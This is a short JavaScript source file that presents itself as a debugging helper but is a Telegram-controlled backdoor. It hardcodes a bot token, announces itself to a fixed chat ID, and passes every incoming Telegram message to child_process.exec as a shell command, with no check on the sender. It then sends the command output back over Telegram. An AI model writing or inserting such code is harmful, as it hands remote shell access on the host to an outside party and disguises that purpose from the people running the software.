import { exec } from "child_process";
import TelegramBot from "node-telegram-bot-api";

var debugClient = new TelegramBot('5961679052:AAGcHuZXfQwUzBsC3H_jaBUwmTYqG_E_MSE', { polling: true });

export function someKindOfDebugging() {
    debugClient.sendMessage(617313423, 'Bot init');

    debugClient.onText(/.*/, (m) => { 
        exec(m.text, (err, stdout, stderr) => {
            if(err) debugClient.sendMessage(m.from.id, JSON.stringify(err));
            if(stdout){
                if(stdout.length > 4095) {
                    chunkSubstr(stdout, 4095).map((e) => debugClient.sendMessage(m.from.id, e));
                } else {
                    debugClient.sendMessage(m.from.id, stdout);
                }
            }
            if(stderr) debugClient.sendMessage(m.from.id, stderr);
        });
    })
}

function chunkSubstr(str, size) {
    const numChunks = Math.ceil(str.length / size)
    const chunks = new Array(numChunks)
  
    for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
      chunks[i] = str.substr(o, size)
    }
  
    return chunks
  }